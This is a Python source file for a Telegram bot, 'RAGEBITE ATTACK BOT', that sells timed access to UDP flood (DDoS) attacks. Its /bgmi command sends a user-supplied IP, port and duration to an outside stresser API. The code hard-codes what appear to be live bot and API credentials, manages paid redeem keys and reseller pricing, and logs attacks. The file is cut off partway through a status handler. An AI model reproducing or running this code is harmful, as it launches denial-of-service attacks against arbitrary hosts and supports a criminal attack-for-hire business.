#!/usr/bin/env python3
"""
RAGEBITE ATTACK BOT - 4 SLOTS
API Completely Hidden - Even from Admins
Run: python ragebite_bot.py
"""

import telebot
import datetime
import os
import time
import threading
import json
import re
import requests
import secrets
import string
from http.server import BaseHTTPRequestHandler, HTTPServer

# ==================== CONFIG ====================
BOT_TOKEN = '8650600804:AAHtQrUHO7aRhLyFO88qoyg7lUVgf522WdM'

# ============ API CONFIGURATION (COMPLETELY HIDDEN) ============
# These are hardcoded and NEVER shown to any user - not even admins
API_BASE_URL = "https://api.godstress.site/api/v1/attack/start"
API_KEY = "nk_a22fac200f1198e63492f7de86149401"
API_METHOD = "UDP-BIG"  # Fixed method
TOTAL_SLOTS = 4

OWNER_ID = "6321758394"  # Only owner has unlimited attacks
ADMIN_IDS = {"7255464548"}  # Initial admins

USER_FILE = "users.txt"
LOG_FILE = "log.txt"
STATE_FILE = "bot_state.json"
PORT = int(os.environ.get("PORT", "8080"))

# ==================== PRICING ====================
# Reseller pricing (in coins) - 10 coins per day
RESELLER_PRICES = {
    "12hr": {"cost": 5, "display": "12 Hours"},
    "1day": {"cost": 10, "display": "1 Day"},
    "1week": {"cost": 70, "display": "1 Week"},
    "15days": {"cost": 150, "display": "15 Days"},
    "1month": {"cost": 300, "display": "1 Month"}
}

# User pricing (in Rs) - For display only
USER_PRICES = {
    "12hr": "100 Rs",
    "1day": "150 Rs",
    "1week": "600 Rs",
    "15days": "750 Rs",
    "1month": "1400 Rs"
}

# ==================== STATE ====================
state = {
    "users": {},
    "admins": [],
    "owners": [OWNER_ID],
    "redeem_keys": {},
    "user_attacks": {},
    "attack_history": []
}

def load_state():
    global state
    try:
        with open(STATE_FILE, "r") as f:
            state = json.load(f)
    except:
        state = {"users": {}, "admins": [], "owners": [OWNER_ID], "redeem_keys": {}, "user_attacks": {}, "attack_history": []}
    state.setdefault("users", {})
    state.setdefault("admins", [])
    state.setdefault("owners", [OWNER_ID])
    state.setdefault("redeem_keys", {})
    state.setdefault("user_attacks", {})
    state.setdefault("attack_history", [])
    save_state()

def save_state():
    try:
        with open(STATE_FILE, "w") as f:
            json.dump(state, f)
    except:
        pass

def now():
    return time.time()

def is_owner(uid):
    return str(uid) in state.get("owners", []) or str(uid) == OWNER_ID

def is_admin(uid):
    return str(uid) in state.get("admins", []) or str(uid) == OWNER_ID

def get_user(uid):
    return state["users"].get(str(uid))

def user_approved(uid):
    u = get_user(uid)
    if not u or not u.get("approved"):
        return False
    if u.get("expires", 0) < now():
        return False
    return True

def generate_key(duration, duration_type):
    """Generate a key with specified duration"""
    key = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(16))
    
    if duration_type == "hr":
        expiry = now() + (duration * 3600)
    elif duration_type == "day":
        expiry = now() + (duration * 86400)
    else:
        return None
    
    state["redeem_keys"][key] = {
        "duration": f"{duration}{duration_type}",
        "expires": expiry,
        "used": False,
        "used_by": None
    }
    save_state()
    return key

def redeem_key(user_id, key):
    """Redeem a key for a user"""
    if key not in state["redeem_keys"]:
        return False, "❌ Invalid key"
    
    key_data = state["redeem_keys"][key]
    if key_data.get("used", False):
        return False, "❌ Key already used"
    if key_data.get("expires", 0) < now():
        return False, "❌ Key expired"
    
    key_data["used"] = True
    key_data["used_by"] = str(user_id)
    save_state()
    
    if str(user_id) not in state["users"]:
        state["users"][str(user_id)] = {}
    
    state["users"][str(user_id)]["approved"] = True
    state["users"][str(user_id)]["expires"] = key_data["expires"]
    state["users"][str(user_id)]["plan"] = key_data["duration"]
    save_state()
    
    with open(USER_FILE, "a") as f:
        f.write(f"{user_id}\n")
    
    expiry_time = datetime.datetime.fromtimestamp(key_data["expires"]).strftime('%Y-%m-%d %H:%M:%S')
    return True, f"✅ Key redeemed!\n📅 Access until: {expiry_time}"

# ==================== BOT SETUP ====================
bot = telebot.TeleBot(BOT_TOKEN)

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        with open(USER_FILE, "w") as file:
            file.write("")
        return []

allowed_user_ids = read_users()

def log_command(user_id, target, port, time_sec):
    try:
        user_info = bot.get_chat(int(user_id))
        username = f"@{user_info.username}" if user_info.username else f"ID:{user_id}"
    except:
        username = f"ID:{user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"[{datetime.datetime.now()}] {username} -> {target}:{port} | {time_sec}s\n")

# ==================== API FUNCTIONS (COMPLETELY HIDDEN) ====================

def start_attack(ip, port, duration):
    """
    Start attack on API - Uses UDP-BIG method
    API details are completely hidden - never shown to anyone
    """
    try:
        # Build the URL with all parameters
        url = f"{API_BASE_URL}?key={API_KEY}&ip={ip}&port={port}&time={duration}&method={API_METHOD}"
        
        print(f"📤 Sending attack: {ip}:{port} for {duration}s")
        
        response = requests.get(url, timeout=15)
        
        print(f"📥 Response: {response.text}")
        
        try:
            return response.json()
        except:
            return {"success": False, "error": f"Invalid response: {response.text}"}
            
    except Exception as e:
        print(f"⚠️ Attack Error: {e}")
        return {"success": False, "error": str(e)}

# ==================== DECORATORS ====================

def owner_only(func):
    def wrapper(message):
        if not is_owner(str(message.chat.id)):
            bot.reply_to(message, "❌ Owner only command.")
            return
        return func(message)
    return wrapper

def admin_only(func):
    def wrapper(message):
        if not is_admin(str(message.chat.id)):
            bot.reply_to(message, "❌ Admin only command.")
            return
        return func(message)
    return wrapper

# ==================== TIMER FUNCTION ====================

def update_timer(message, chat_id, msg_id, target, port, duration, start_time, is_admin_user, is_owner_user):
    """Update timer every 5 seconds showing remaining time"""
    try:
        elapsed = 0
        while elapsed < duration:
            time.sleep(5)
            elapsed += 5
            remaining = duration - elapsed
            
            if remaining <= 0:
                break
            
            finish_time = (datetime.datetime.now() + datetime.timedelta(seconds=remaining)).strftime('%H:%M:%S')
            
            bar_length = 20
            filled = int((elapsed / duration) * bar_length)
            bar = "█" * filled + "░" * (bar_length - filled)
            
            if is_owner_user:
                admin_tag = " 👑 OWNER"
                timer_text = f"""⚡ ATTACK IN PROGRESS!{admin_tag}

🎯 Target: {target}:{port}
⏱ Elapsed: {elapsed}s / {duration}s
⏳ Remaining: {remaining}s
📊 Progress: [{bar}] {int((elapsed/duration)*100)}%

⌛ Finishes: {finish_time}

🔥 RAGEBITE ULTIMATE POWER"""
            elif is_admin_user:
                admin_tag = " 👑 ADMIN"
                timer_text = f"""⚡ ATTACK IN PROGRESS!{admin_tag}

🎯 Target: {target}:{port}
⏱ Elapsed: {elapsed}s / {duration}s
⏳ Remaining: {remaining}s
📊 Progress: [{bar}] {int((elapsed/duration)*100)}%

⌛ Finishes: {finish_time}

🔥 RAGEBITE ULTIMATE POWER"""
            else:
                timer_text = f"""⚡ ATTACK IN PROGRESS!

🎯 Target: {target}:{port}
⏱ Elapsed: {elapsed}s / {duration}s
⏳ Remaining: {remaining}s
📊 Progress: [{bar}] {int((elapsed/duration)*100)}%

⌛ Finishes: {finish_time}

🔥 RAGEBITE ULTIMATE POWER"""
            
            try:
                bot.edit_message_text(timer_text, chat_id, msg_id)
            except Exception as e:
                print(f"Timer update error: {e}")
                break
                
    except Exception as e:
        print(f"Timer thread error: {e}")

# ==================== HEALTH SERVER ====================
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Ragebite Bot is running!")

def start_health_server():
    try:
        server = HTTPServer(("0.0.0.0", PORT), HealthHandler)
        server.serve_forever()
    except:
        pass

# ==================== BOT COMMANDS ====================

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = str(message.chat.id)
    user_name = message.from_user.first_name
    is_approved = user_approved(user_id) or is_admin(user_id)
    
    if is_owner(user_id):
        response = f'''🌟 Welcome to RAGEBITE BOT {user_name}! 👑 OWNER

⚡ The Ultimate Attack Solution

✅ Status: Owner Access ✅

💥 User Commands:
/bgmi <ip> <port> <time> - Launch attack
/status - Check your attack status
/redeem <key> - Activate your access
/plan - View pricing plans
/help - Full guide

👑 Owner Commands (Full Access):
/ownerpanel - Full control panel
/alladmins - List all admins
/addadmin <id> - Add admin
/removeadmin <id> - Remove admin

🔥 Features:
• Ultimate Power
• Lightning Fast
• 24/7 Uptime
• Premium Quality

💪 Ready to dominate!'''
    elif is_admin(user_id):
        response = f'''🌟 Welcome to RAGEBITE BOT {user_name}! 👑 ADMIN

⚡ The Ultimate Attack Solution

✅ Status: Admin Access ✅

💥 Commands:
/bgmi <ip> <port> <time> - Launch attack
/status - Check your attack status
/redeem <key> - Activate your access
/plan - View pricing plans
/help - Full guide

👑 Admin Commands:
/generate 12hr/1day/1week/15days/1month - Generate key
/deletekey <key> - Delete a key
/keyslist - Show generated keys
/add <user_id> - Add user
/remove <user_id> - Remove user
/allusers - List all users
/activeattacks - See active attacks
/addadmin <id> - Add admin
/removeadmin <id> - Remove admin

📌 Note: Admin = 1 attack at a time (same as users)
📌 Note: Owner cannot be removed

🔥 Features:
• Ultimate Power
• Lightning Fast
• 24/7 Uptime
• Premium Quality

💪 Ready to dominate!'''
    else:
        response = f'''🌟 Welcome to RAGEBITE BOT {user_name}!

⚡ The Ultimate Attack Solution

✅ Status: {'Active ✅' if is_approved else 'Inactive ❌'}

💥 Commands:
/bgmi <ip> <port> <time> - Launch attack
/status - Check your attack status
/redeem <key> - Activate your access
/plan - View pricing plans
/help - Full guide

🔥 Features:
• Ultimate Power
• Lightning Fast
• 24/7 Uptime
• Premium Quality

💪 Ready to dominate!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    user_id = str(message.chat.id)
    
    if is_owner(user_id):
        help_text = '''🌟 RAGEBITE BOT - OWNER HELP

💥 Attack Commands:
/bgmi <ip> <port> <time> - Launch attack

🔑 Key Commands:
/redeem <key> - Activate access key

📊 Info Commands:
/status - Check your attack status
/plan - View pricing plans
/id - Your user ID
/help - This menu

👑 OWNER COMMANDS (Full Access):
/ownerpanel - Complete control panel
/alladmins - List all admins
/addadmin <id> - Add admin
/removeadmin <id> - Remove admin
/stats - Full bot statistics

👑 ADMIN COMMANDS:
/generate 12hr/1day/1week/15days/1month - Generate key
/deletekey <key> - Delete a key
/keyslist - Show generated keys
/add <user_id> - Add user
/remove <user_id> - Remove user
/allusers - List all users
/activeattacks - See active attacks
/attackhistory - See attack history
/addadmin <id> - Add admin
/removeadmin <id> - Remove admin

📌 RULES:
• 4 Slots available
• 1 User = 1 Attack at a time
• Admin = 1 Attack at a time (same as users)
• Owner = Unlimited attacks
• Admin can add and remove admins
• Owner cannot be removed
• Max 300 seconds per attack'''
    elif is_admin(user_id):
        help_text = '''🌟 RAGEBITE BOT - ADMIN HELP

💥 Attack Commands:
/bgmi <ip> <port> <time> - Launch attack

🔑 Key Commands:
/redeem <key> - Activate access key

📊 Info Commands:
/status - Check your attack status
/plan - View pricing plans
/id - Your user ID
/help - This menu

👑 ADMIN COMMANDS:
/generate 12hr/1day/1week/15days/1month - Generate key
/deletekey <key> - Delete a key
/keyslist - Show generated keys
/add <user_id> - Add user
/remove <user_id> - Remove user
/allusers - List all users
/activeattacks - See active attacks
/attackhistory - See attack history
/addadmin <id> - Add admin
/removeadmin <id> - Remove admin

📌 RULES:
• 4 Slots available
• 1 User = 1 Attack at a time
• Admin = 1 Attack at a time (same as users)
• Owner = Unlimited attacks
• Admin can add and remove admins
• Owner cannot be removed
• Max 300 seconds per attack'''
    else:
        help_text = '''🌟 RAGEBITE BOT - HELP

💥 Attack Commands:
/bgmi <ip> <port> <time> - Launch attack
  • IP: Valid IP address
  • Port: 1-65535
  • Time: 10-300 seconds

🔑 Key Commands:
/redeem <key> - Activate access key

📊 Info Commands:
/status - Check your attack status
/plan - View pricing plans
/id - Your user ID
/help - This menu

📌 RULES:
• 4 Slots available
• 1 User = 1 Attack at a time
• Different users can attack at same time
• Max 300 seconds per attack

⚠️ NO BUGS - NO DELAYS - ULTIMATE POWER'''
    
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    bot.reply_to(message, f"🆔 Your ID: `{message.chat.id}`", parse_mode='Markdown')

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    response = '''🌟 RAGEBITE PLANS:

💎 ULTIMATE PLAN:
→ Attack Time: 300 seconds
→ Priority Support
→ No Waiting Time

💰 PRICES (For Users - Rs):
• 12 Hours: 100 Rs
• 1 Day: 150 Rs
• 1 Week: 600 Rs
• 15 Days: 750 Rs
• 1 Month: 1400 Rs

🔑 Reseller Cost (Coins - 10/day):
• 12 Hours: 5 coins
• 1 Day: 10 coins
• 1 Week: 70 coins
• 15 Days: 150 coins
• 1 Month: 300 coins

📩 Contact your respective seller to purchase keys

⚡ DOMINATE WITH RAGEBITE!'''
    bot.reply_to(message, response)

# ==================== KEY COMMANDS ====================

@bot.message_handler(commands=['redeem'])
def redeem_command(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    
    if len(command) != 2:
        bot.reply_to(message, "❌ Usage: /redeem <key>\nExample: /redeem ABC123XYZ")
        return
    
    key = command[1].upper()
    success, msg = redeem_key(user_id, key)
    bot.reply_to(message, msg)

@bot.message_handler(commands=['generate'])
@admin_only
def generate_key_command(message):
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, """❌ Usage: /generate <duration>

Available durations (Reseller cost in coins):
• /generate 12hr - 12 Hours (5 coins)
• /generate 1day - 1 Day (10 coins)
• /generate 1week - 1 Week (70 coins)
• /generate 15days - 15 Days (150 coins)
• /generate 1month - 1 Month (300 coins)

📌 User pays: 
• 12 Hours: 100 Rs
• 1 Day: 150 Rs
• 1 Week: 600 Rs
• 15 Days: 750 Rs
• 1 Month: 1400 Rs""")
        return
    
    duration_str = command[1].lower()
    
    # Map duration strings to (duration_value, duration_type)
    duration_map = {
        '12hr': (12, 'hr'),
        '1day': (1, 'day'),
        '1week': (7, 'day'),
        '15days': (15, 'day'),
        '1month': (30, 'day')
    }
    
    if duration_str not in duration_map:
        bot.reply_to(message, "❌ Invalid duration. Available: 12hr, 1day, 1week, 15days, 1month")
        return
    
    dur, dur_type = duration_map[duration_str]
    key = generate_key(dur, dur_type)
    
    if key:
        display_name = RESELLER_PRICES.get(duration_str, {}).get('display', duration_str)
        cost = RESELLER_PRICES.get(duration_str, {}).get('cost', 0)
        user_price = USER_PRICES.get(duration_str, '0 Rs')
        bot.reply_to(message, f"""✅ Key Generated!

🔑 Key: `{key}`
⏱ Duration: {display_name}
💰 Reseller Cost: {cost} coins
💵 User Price: {user_price}

📌 User can redeem with:
/redeem {key}""", parse_mode='Markdown')
    else:
        bot.reply_to(message, "❌ Failed to generate key.")

@bot.message_handler(commands=['deletekey'])
@admin_only
def delete_key_command(message):
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "❌ Usage: /deletekey <key>")
        return
    
    key = command[1].upper()
    
    if key not in state["redeem_keys"]:
        bot.reply_to(message, "❌ Key not found.")
        return
    
    del state["redeem_keys"][key]
    save_state()
    bot.reply_to(message, f"✅ Key `{key}` deleted successfully!", parse_mode='Markdown')

@bot.message_handler(commands=['keyslist'])
@admin_only
def keyslist_command(message):
    if not state.get("redeem_keys"):
        bot.reply_to(message, "ℹ️ No keys generated yet.")
        return
    
    response = "🔑 Generated Keys:\n\n"
    for key, data in state["redeem_keys"].items():
        status = "✅ Used" if data.get("used") else "🆓 Available"
        used_by = f" | Used by: {data.get('used_by')}" if data.get("used") else ""
        expiry = datetime.datetime.fromtimestamp(data["expires"]).strftime('%d-%m %H:%M')
        response += f"• `{key}`\n   {status}{used_by} | Expires: {expiry}\n\n"
    
    bot.reply_to(message, response, parse_mode='Markdown')

# ==================== 🔥 BGMI COMMAND ====================

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    
    # Check authorization
    if not user_approved(user_id) and not is_admin(user_id) and not is_owner(user_id):
        bot.reply_to(message, "❌ Access Denied!\nUse /redeem <key> to activate.\n\nContact your respective seller to purchase keys.")
        return
    
    # Parse command
    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "❌ Usage: /bgmi <ip> <port> <time>\nExample: /bgmi 1.2.3.4 443 60")
        return
    
    target, port_str, time_str = command[1], command[2], command[3]
    
    # Validate IP
    if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target):
        bot.reply_to(message, "❌ Invalid IP address.")
        return
    
    # Validate port and time
    try:
        port = int(port_str)
        duration = int(time_str)
        if not 1 <= port <= 65535:
            bot.reply_to(message, "❌ Port must be between 1-65535.")
            return
        if duration < 10:
            bot.reply_to(message, "❌ Minimum time is 10 seconds.")
            return
        if duration > 300:
            bot.reply_to(message, "❌ Maximum time is 300 seconds.")
            return
    except ValueError:
        bot.reply_to(message, "❌ Port and time must be numbers.")
        return
    
    # ========== CHECK USER/ADMIN ATTACK LIMIT ==========
    # Owner = Unlimited attacks
    # Admin = 1 attack at a time (same as users)
    
    if not is_owner(user_id):
        if user_id in state["user_attacks"]:
            attack_data = state["user_attacks"][user_id]
            if attack_data["expires"] > now():
                remaining = int(attack_data["expires"] - now())
                user_type = "ADMIN" if is_admin(user_id) else "USER"
                bot.reply_to(message, f"""❌ ATTACK IN PROGRESS! ({user_type})

⏱ Time remaining: {remaining}s
🎯 Target: {attack_data['ip']}:{attack_data['port']}

⚠️ Wait for current attack to finish!
Only 1 attack at a time per person.""")
                return
            else:
                del state["user_attacks"][user_id]
                save_state()
    
    # ========== START ATTACK ==========
    log_command(user_id, target, port, duration)
    
    # Send initial message
    msg = bot.reply_to(message, "⚡ Initiating Ultimate Attack...")
    chat_id = message.chat.id
    msg_id = msg.message_id
    
    # Call the API (details hidden)
    result = start_attack(target, port, duration)
    
    print(f"🔍 Attack Result for {user_id}: {result}")
    
    if not result.get("success"):
        error = result.get("error", "Unknown error")
        bot.edit_message_text(f"❌ Attack Failed!\nError: {error}", chat_id, msg_id)
        return
    
    # ========== GET USER INFO FOR TRACKING ==========
    try:
        user_info = bot.get_chat(int(user_id))
        username = f"@{user_info.username}" if user_info.username else f"ID:{user_id}"
    except:
        username = f"ID:{user_id}"
    
    # ========== TRACK USER ATTACK ==========
    attack_data = {
        "ip": target,
        "port": port,
        "duration": duration,
        "expires": now() + duration + 5,
        "username": username,
        "user_id": user_id,
        "start_time": datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "is_admin": is_admin(user_id),
        "is_owner": is_owner(user_id)
    }
    
    state["user_attacks"][user_id] = attack_data
    
    # ========== STORE IN ATTACK HISTORY ==========
    state["attack_history"].append({
        "user_id": user_id,
        "username": username,
        "ip": target,
        "port": port,
        "duration": duration,
        "start_time": datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "is_admin": is_admin(user_id),
        "is_owner": is_owner(user_id)
    })
    
    if len(state["attack_history"]) > 100:
        state["attack_history"] = state["attack_history"][-100:]
    
    save_state()
    
    # ========== SHOW INITIAL TIMER MESSAGE ==========
    start_time = datetime.datetime.now()
    finish_time = (start_time + datetime.timedelta(seconds=duration)).strftime('%H:%M:%S')
    is_admin_user = is_admin(user_id)
    is_owner_user = is_owner(user_id)
    
    if is_owner_user:
        admin_tag = " 👑 OWNER"
        timer_text = f"""⚡ ATTACK LAUNCHED!{admin_tag}

🎯 Target: {target}:{port}
⏱ Duration: {duration}s
⏳ Remaining: {duration}s
📊 Progress: [░░░░░░░░░░░░░░░░░░░░] 0%

⌛ Finishes: {finish_time}

🔥 RAGEBITE ULTIMATE POWER

✅ Attack is running!
📊 Timer will update every 5 seconds."""
    elif is_admin_user:
        admin_tag = " 👑 ADMIN"
        timer_text = f"""⚡ ATTACK LAUNCHED!{admin_tag}

🎯 Target: {target}:{port}
⏱ Duration: {duration}s
⏳ Remaining: {duration}s
📊 Progress: [░░░░░░░░░░░░░░░░░░░░] 0%

⌛ Finishes: {finish_time}

🔥 RAGEBITE ULTIMATE POWER

✅ Attack is running!
📊 Timer will update every 5 seconds."""
    else:
        timer_text = f"""⚡ ATTACK LAUNCHED!

🎯 Target: {target}:{port}
⏱ Duration: {duration}s
⏳ Remaining: {duration}s
📊 Progress: [░░░░░░░░░░░░░░░░░░░░] 0%

⌛ Finishes: {finish_time}

🔥 RAGEBITE ULTIMATE POWER

✅ Attack is running!
📊 Timer will update every 5 seconds."""
    
    bot.edit_message_text(timer_text, chat_id, msg_id)
    
    # ========== START TIMER THREAD ==========
    timer_thread = threading.Thread(
        target=update_timer,
        args=(message, chat_id, msg_id, target, port, duration, start_time, is_admin_user, is_owner_user),
        daemon=True
    )
    timer_thread.start()
    
    # ========== NOTIFY WHEN FINISHED ==========
    def notify_end():
        time.sleep(duration + 3)
        
        if user_id in state["user_attacks"]:
            del state["user_attacks"][user_id]
            save_state()
        
        try:
            final_text = f"""✅ ATTACK COMPLETED!

🎯 Target: {target}:{port}
⏱ Duration: {duration}s
🕐 Finished: {datetime.datetime.now().strftime('%H:%M:%S')}

🔥 RAGEBITE - Ready for next attack!
💪 You can start a new attack now.

⚡ Ultimate Power - No Limits!"""
            
            try:
                bot.edit_message_text(final_text, chat_id, msg_id)
            except:
                bot.send_message(user_id, final_text)
                
        except Exception as e:
            print(f"Notify error: {e}")
    
    threading.Thread(target=notify_end, daemon=True).start()

# ==================== ADMIN & OWNER COMMANDS ====================

@bot.message_handler(commands=['addadmin'])
@admin_only
def add_admin_command(message):
    """Admin can add other admins | Owner can also add admins"""
    user_id = str(message.chat.id)
    command = message.text.split()
    
    if len(command) != 2:
        bot.reply_to(message, "❌ Usage: /addadmin <user_id>")
        return
    
    uid = command[1]
    
    # Check if user is already admin
    if uid in state.get("admins", []):
        bot.reply_to(message, "ℹ️ User is already admin.")
        return
    
    # Check if user is owner
    if uid in state.get("owners", []):
        bot.reply_to(message, "❌ Cannot add owner as admin.")
        return
    
    # Check if trying to add self
    if uid == user_id:
        bot.reply_to(message, "❌ You are already admin.")
        return
    
    # Add admin
    state["admins"].append(uid)
    save_state()
    
    bot.reply_to(message, f"""✅ User {uid} is now ADMIN!

👑 Admin Benefits:
• Generate keys: /generate
• Delete keys: /deletekey
• Add users: /add
• Remove users: /remove
• See active attacks: /activeattacks
• See attack history: /attackhistory
• Add admins: /addadmin
• Remove admins: /removeadmin

📌 Note: Admin = 1 attack at a time (same as users)
📌 Note: Owner cannot be removed""")

@bot.message_handler(commands=['removeadmin'])
@admin_only
def remove_admin_command(message):
    """Admin can remove other admins | Owner can also remove admins"""
    user_id = str(message.chat.id)
    command = message.text.split()
    
    if len(command) != 2:
        bot.reply_to(message, "❌ Usage: /removeadmin <user_id>")
        return
    
    uid = command[1]
    
    # Check if user is admin
    if uid not in state.get("admins", []):
        bot.reply_to(message, "❌ User is not admin.")
        return
    
    # Check if trying to remove owner
    if uid in state.get("owners", []):
        bot.reply_to(message, "❌ Cannot remove owner.")
        return
    
    # Check if trying to remove self
    if uid == user_id:
        bot.reply_to(message, "❌ You cannot remove yourself as admin.")
        return
    
    # Remove admin
    state["admins"].remove(uid)
    save_state()
    bot.reply_to(message, f"✅ User {uid} removed from admins.")

# ==================== OWNER COMMANDS ====================

@bot.message_handler(commands=['ownerpanel'])
@owner_only
def owner_panel(message):
    """Owner full control panel - API details still hidden even from owner"""
    response = '''👑 RAGEBITE OWNER PANEL

📊 SYSTEM STATUS:
• Bot: Online ✅
• API: Connected ✅
• Method: UDP-BIG (Fixed)
• Slots: 4

📊 STATISTICS:
• Total Users: ''' + str(len(allowed_user_ids)) + '''
• Active Attacks: ''' + str(len([a for a in state["user_attacks"].values() if a["expires"] > now()])) + '''
• Admins: ''' + str(len(state.get("admins", []))) + '''
• Total Attacks: ''' + str(len(state.get("attack_history", []))) + '''

🔐 API: Protected (Hidden from all users)

👑 OWNER COMMANDS:
/alladmins - List all admins
/addadmin <id> - Add admin
/removeadmin <id> - Remove admin
/stats - Full statistics
/clearbotstate - Clear all state

🔐 SECURITY: HIGH
💪 RAGEBITE POWER!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['alladmins'])
@owner_only
def all_admins_command(message):
    """Owner sees all admins"""
    admins = state.get("admins", [])
    
    if not admins:
        bot.reply_to(message, "ℹ️ No admins added.")
        return
    
    response = "👑 Admins List:\n\n"
    for admin in admins:
        try:
            user_info = bot.get_chat(int(admin))
            username = f"@{user_info.username}" if user_info.username else admin
            response += f"• {username} (ID: {admin})\n"
        except:
            response += f"• ID: {admin}\n"
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['clearbotstate'])
@owner_only
def clear_bot_state_command(message):
    """Owner: Clear all bot state"""
    state["user_attacks"] = {}
    state["attack_history"] = []
    save_state()
    bot.reply_to(message, "✅ Bot state cleared! All active attacks and history removed.")

# ==================== ADMIN COMMANDS (User Management) ====================

@bot.message_handler(commands=['activeattacks'])
@admin_only
def active_attacks_command(message):
    """Admin: See all active attacks with details (NO API details)"""
    current_time = now()
    expired_users = []
    for uid, attack in state["user_attacks"].items():
        if attack["expires"] < current_time:
            expired_users.append(uid)
    
    for uid in expired_users:
        del state["user_attacks"][uid]
    
    if expired_users:
        save_state()
    
    if not state["user_attacks"]:
        bot.reply_to(message, "📊 No active attacks currently.")
        return
    
    response = "🔥 ACTIVE ATTACKS:\n"
    response += "═" * 30 + "\n\n"
    
    attack_count = 0
    for uid, attack in state["user_attacks"].items():
        if attack["expires"] > now():
            attack_count += 1
            remaining = int(attack["expires"] - now())
            
            is_owner_user = attack.get("is_owner", False)
            is_admin_user = attack.get("is_admin", False)
            
            if is_owner_user:
                tag = " 👑 OWNER"
            elif is_admin_user:
                tag = " 👑 ADMIN"
            else:
                tag = ""
            
            response += f"""#{attack_count} {attack.get('username', uid)}{tag}
🎯 {attack['ip']}:{attack['port']}
⏱ {attack['duration']}s | ⏳ {remaining}s left
🕐 Started: {attack.get('start_time', 'Unknown')}
─────────────────
"""
    
    response += f"\n📊 Total Active: {attack_count}"
    
    if len(response) > 4000:
        parts = [response[i:i+4000] for i in range(0, len(response), 4000)]
        for part in parts:
            bot.reply_to(message, part)
    else:
        bot.reply_to(message, response)

@bot.message_handler(commands=['attackhistory'])
@admin_only
def attack_history_command(message):
    """Admin: See attack history (NO API details)"""
    history = state.get("attack_history", [])
    
    if not history:
        bot.reply_to(message, "📊 No attack history yet.")
        return
    
    recent = history[-20:]
    
    response = "📜 ATTACK HISTORY (Last 20):\n"
    response += "═" * 30 + "\n\n"
    
    for i, entry in enumerate(reversed(recent), 1):
        is_owner_user = entry.get("is_owner", False)
        is_admin_user = entry.get("is_admin", False)
        
        if is_owner_user:
            tag = " 👑 OWNER"
        elif is_admin_user:
            tag = " 👑 ADMIN"
        else:
            tag = ""
        
        response += f"""#{i} {entry.get('username', entry.get('user_id', 'Unknown'))}{tag}
🎯 {entry['ip']}:{entry['port']}
⏱ {entry['duration']}s
🕐 {entry.get('start_time', 'Unknown')}
─────────────────
"""
    
    response += f"\n📊 Total Attacks: {len(history)}"
    
    if len(response) > 4000:
        parts = [response[i:i+4000] for i in range(0, len(response), 4000)]
        for part in parts:
            bot.reply_to(message, part)
    else:
        bot.reply_to(message, response)

@bot.message_handler(commands=['add'])
@admin_only
def add_user(message):
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "❌ Usage: /add <user_id>")
        return
    
    user_to_add = command[1]
    if user_to_add in allowed_user_ids:
        bot.reply_to(message, "ℹ️ User already exists.")
        return
    
    allowed_user_ids.append(user_to_add)
    with open(USER_FILE, "a") as file:
        file.write(f"{user_to_add}\n")
    
    state["users"][user_to_add] = {"approved": True, "expires": now() + 86400 * 30}
    save_state()
    bot.reply_to(message, f"✅ User {user_to_add} added successfully!")

@bot.message_handler(commands=['remove'])
@admin_only
def remove_user(message):
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "❌ Usage: /remove <user_id>")
        return
    
    user_to_remove = command[1]
    if user_to_remove not in allowed_user_ids:
        bot.reply_to(message, "❌ User not found.")
        return
    
    allowed_user_ids.remove(user_to_remove)
    with open(USER_FILE, "w") as file:
        for uid in allowed_user_ids:
            file.write(f"{uid}\n")
    
    if user_to_remove in state["users"]:
        del state["users"][user_to_remove]
        save_state()
    
    bot.reply_to(message, f"✅ User {user_to_remove} removed.")

@bot.message_handler(commands=['allusers'])
@admin_only
def show_all_users(message):
    if not allowed_user_ids:
        bot.reply_to(message, "ℹ️ No users found.")
        return
    
    response = "👥 Authorized Users:\n\n"
    for uid in allowed_user_ids:
        try:
            user_info = bot.get_chat(int(uid))
            username = f"@{user_info.username}" if user_info.username else uid
            
            if uid in state["user_attacks"]:
                attack = state["user_attacks"][uid]
                if attack["expires"] > now():
                    remaining = int(attack["expires"] - now())
                    status_icon = f"🔴 Active ({remaining}s left) → {attack['ip']}:{attack['port']}"
                else:
                    status_icon = "🟢 Free"
            else:
                status_icon = "🟢 Free"
            
            admin_tag = " 👑" if is_admin(uid) else ""
            
            response += f"• {username}{admin_tag} (ID: {uid}) - {status_icon}\n"
        except:
            response += f"• ID: {uid}\n"
    
    bot.reply_to(message, response)

# ==================== STATUS COMMANDS ====================

@bot.message_handler(commands=['status'])
def status_attack(message):
    user_id = str(message.chat.id)
    
    if not is_admin(user_id) and user_id in state["user_attacks"]:
        attack = state["user_attacks"][user_id]
        remaining = int(attack["expires"] - now())
        if remaining > 0:
            response = f'''⚡ YOUR ATTACK STATUS:

🎯 Target: {attack['ip']}:{attack['port']}
⏱ Time remaining: {remaining}s
🔄 Active: Yes

🔥 Ragebite Ultimate Attack

✅ Attack is in progress!
⏳ Will finish automatically.
📨 You'll get notification when done.

💪 Patience - Power is working!'''
            bot.reply_to(message, response)
            return
    
    if is_owner(user_id):
        response = f'''⚡ RAGEBITE STATUS - OWNER VIEW:

🌐 Service Status: Online ✅
